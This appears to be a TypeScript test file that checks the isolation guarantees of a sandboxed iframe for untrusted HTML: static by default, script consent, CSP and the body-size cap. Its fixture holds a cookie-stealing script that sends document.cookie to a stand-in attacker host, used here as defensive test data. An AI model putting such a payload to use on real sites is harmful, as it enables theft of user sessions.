/**
 * ADR 0128 Phase 2 + IART-6 + ADR 1017 D1 — SECURITY tests for the sandboxed
 * interactive-artifact frame. These assert the isolation invariants that keep untrusted
 * HTML from touching the parent or the network, ON THE RENDERED IFRAME (not just the
 * exported constants): STATIC by default (`sandbox=""` + `inert`, the only mode with no
 * egress — ADR 1017 M1 measured self-navigation, meta refresh and WebRTC leaving an
 * `allow-scripts` frame), scripts only after the viewer's Run (consent keyed so it never
 * carries to other content), no allow-same-origin in either mode, the CSP with
 * `img-src data:` only, no referrer, the body only in srcdoc, and the 512,000-char body
 * cap at its boundary. The frame is always-on, so no feature gate is mocked.
 *
 * Posture values are pinned as LITERALS (never built from the exported constants),
 * so a loosened constant moves the product and not the expectation. Copy is pinned as
 * the English literal the i18n setup renders, never as a key-or-text regex.
 *
 * `inert` is set by the component itself (React 18 has no prop, so a layout effect
 * writes the attribute). The real-browser egress spec (`e2e/artifact-sandbox-egress
 * .spec.ts`) applies `inert` on its own fixture, so THIS file is where the product
 * setting it is witnessed (TST-JZB-1): the first, second and consent cases red when
 * the effect stops writing it.
 */
import { describe, it, expect, afterEach } from 'vitest';
import { render, cleanup, fireEvent, screen } from '@testing-library/react';
import { SandboxedArtifactFrame, buildArtifactSrcdoc, ARTIFACT_SANDBOX, ARTIFACT_CSP } from '../SandboxedArtifactFrame.js';

const runButton = (): HTMLElement => screen.getByRole('button', { name: /run ?scripts/i });

afterEach(cleanup);

const EVIL = '<script>fetch("https://evil.example/?c="+document.cookie)</script><h1>art</h1>';
const CSP_LITERAL = "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:;";
const CSP_META = `<meta http-equiv="Content-Security-Policy" content="${CSP_LITERAL}">`;
const SCRIPTS_OFF_NOTICE = "Scripts are off, so this static preview can't be scrolled or clicked. Running its scripts lets it interact, and lets it send this content, and anything you type into it, to other sites.";
const STATIC_COMPLETE_NOTICE = 'This content has no scripts or links, so this static preview shows all of it.';

function renderedSrcdoc(body: string): string {
  const { container } = render(<SandboxedArtifactFrame body={body} />);
  const srcdoc = container.querySelector('iframe')?.getAttribute('srcdoc');
  if (srcdoc == null) throw new Error('no iframe srcdoc rendered');
  return srcdoc;
}

/** The untrusted body as it sits inside the rendered document's <body>. */
function bodyOf(srcdoc: string): string {
  return srcdoc.slice(srcdoc.indexOf('<body>') + '<body>'.length, srcdoc.lastIndexOf('</body>'));
}

describe('SandboxedArtifactFrame — isolation invariants', () => {
  it('ADR 1017 D1: renders STATIC by default — sandbox="" and inert, so nothing runs, is clicked or leaves', () => {
    const { container } = render(<SandboxedArtifactFrame body={EVIL} />);
    const iframe = container.querySelector('iframe')!;
    expect(iframe.getAttribute('sandbox')).toBe('');
    expect(iframe.hasAttribute('inert')).toBe(true);
    expect(iframe.getAttribute('referrerpolicy')).toBe('no-referrer');
    // The Run control is in the PARENT, never inside the untrusted document.
    expect(iframe.contains(runButton())).toBe(false);
    // …and it is described by the egress warning, so the consent is informed.
    const describedBy = runButton().getAttribute('aria-describedby');
    expect(describedBy).toBeTruthy();
    expect(document.getElementById(describedBy ?? '')?.textContent).toBe(SCRIPTS_OFF_NOTICE);
  });

  it('ADR 1017 D1: Run remounts the frame with allow-scripts ONLY (never allow-same-origin), not inert; Stop returns to static', () => {
    const { container } = render(<SandboxedArtifactFrame body={EVIL} />);
    const before = container.querySelector('iframe')!;
    fireEvent.click(runButton());
    const running = container.querySelector('iframe')!;
    // A NEW element: the browser reads sandbox flags only at navigation.
    expect(running).not.toBe(before);
    expect(running.getAttribute('sandbox')).toBe('allow-scripts');
    expect(running.hasAttribute('inert')).toBe(false);
    expect(running.getAttribute('referrerpolicy')).toBe('no-referrer');
    fireEvent.click(screen.getByRole('button', { name: /stop ?scripts/i }));
    const stopped = container.querySelector('iframe')!;
    expect(stopped.getAttribute('sandbox')).toBe('');
    expect(stopped.hasAttribute('inert')).toBe(true);
  });

  // Grade-ux B1 — `inert` hides the static frame from assistive tech, so the parent
  // carries its text (parsed without running anything; scripts never become text).
  it('ADR 1017 D1: the static frame has a screen-reader text alternative, without script text', () => {
    const { container } = render(<SandboxedArtifactFrame body={'<h1>Quarterly plan</h1><script>steal()</script><p>Ship it</p>'} />);
    const alt = container.querySelector('.sr-only');
    // Exact: the label, then the text nodes joined by spaces (block elements never
    // run together into one word), and no script text.
    expect(alt?.textContent).toBe('Text of this preview Quarterly plan Ship it');
    expect(alt?.textContent).not.toContain('steal');
    // The text is a text node — never parsed into the parent as markup.
    expect(container.querySelector('h1')).toBeNull();
    fireEvent.click(runButton());
    expect(container.querySelector('.sr-only')).toBeNull();
  });

  // Grade-ux re-grade #4 — content with no scripts, links or controls is shown in full
  // by the static preview, so the viewer is never asked to grant network-capable
  // scripts for nothing.
  it('ADR 1017 D1: static-only content offers no Run button and says it is complete', () => {
    render(<SandboxedArtifactFrame body="<h2>Plan</h2><p>Three steps.</p>" />);
    expect(screen.queryByRole('button', { name: /run ?scripts/i })).toBeNull();
    expect(screen.getByText(STATIC_COMPLETE_NOTICE)).toBeTruthy();
    expect(screen.queryByText(SCRIPTS_OFF_NOTICE)).toBeNull();
    cleanup();
    render(<SandboxedArtifactFrame body={'<a href="https://x.example">x</a>'} />);
    expect(runButton()).toBeTruthy();
  });

  it('ADR 1017 D1: consent never carries to other content — a new body (default key) or a new consentKey starts static', () => {
    const { container, rerender } = render(<SandboxedArtifactFrame body="<p>a</p><script>x()</script>" />);
    fireEvent.click(runButton());
    expect(container.querySelector('iframe')!.getAttribute('sandbox')).toBe('allow-scripts');
    rerender(<SandboxedArtifactFrame body="<p>b</p><script>x()</script>" />);
    expect(container.querySelector('iframe')!.getAttribute('sandbox')).toBe('');
    cleanup();

    // A stable key keeps consent across body changes (the viewer's own live-edit draft)…
    const keyed = render(<SandboxedArtifactFrame body="<p>a</p><script>x()</script>" consentKey="art-1:r1" />);
    fireEvent.click(runButton());
    keyed.rerender(<SandboxedArtifactFrame body="<p>a, edited</p><script>x()</script>" consentKey="art-1:r1" />);
    expect(keyed.container.querySelector('iframe')!.getAttribute('sandbox')).toBe('allow-scripts');
    // …and a different key (another artifact or revision) drops it.
    keyed.rerender(<SandboxedArtifactFrame body="<p>a, edited</p><script>x()</script>" consentKey="art-2:r1" />);
    expect(keyed.container.querySelector('iframe')!.getAttribute('sandbox')).toBe('');
    expect(keyed.container.querySelector('iframe')!.hasAttribute('inert')).toBe(true);
  });

  it('injects the CSP (default-src none, img-src data: only) into the RENDERED frame — it blocks fetch and images, not self-navigation (ADR 1017 M1)', () => {
    expect(ARTIFACT_CSP).toBe(CSP_LITERAL);
    const srcdoc = renderedSrcdoc(EVIL);
    // The rendered frame carries the exact policy, in <head>, before the untrusted body.
    expect(srcdoc).toContain(CSP_META);
    expect(srcdoc.indexOf(CSP_META)).toBeLessThan(srcdoc.indexOf('<body>'));
    // The exported helper carries the same literal policy (other callers use it).
    expect(buildArtifactSrcdoc('x')).toContain(CSP_META);
  });

  it('puts the untrusted body ONLY in srcdoc — never the parent DOM', () => {
    const { container } = render(<SandboxedArtifactFrame body={EVIL} />);
    // The parent must not contain the raw <script>/<h1> as real DOM nodes.
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('h1')).toBeNull();
    // It lives in the iframe srcdoc (a string attribute), origin-isolated.
    expect(bodyOf(container.querySelector('iframe')!.getAttribute('srcdoc')!)).toBe(EVIL);
  });

  it('IART-6: caps the body at exactly 512,000 chars (boundary: at the cap untouched, one over truncated)', () => {
    expect(bodyOf(renderedSrcdoc('a'.repeat(512_000))).length).toBe(512_000);
    cleanup();
    expect(bodyOf(renderedSrcdoc('a'.repeat(512_001))).length).toBe(512_000);
    cleanup();
    const huge = bodyOf(renderedSrcdoc('a'.repeat(600_000)));
    expect(huge.length).toBe(512_000);
    expect(huge).toBe('a'.repeat(512_000)); // the (truncated) content still renders
  });

  it('ARTIFACT_SANDBOX (the running mode) is allow-scripts only', () => {
    // Redundant with the rendered-attribute case above; kept (protected security file).
    expect(ARTIFACT_SANDBOX).toBe('allow-scripts');
  });
});
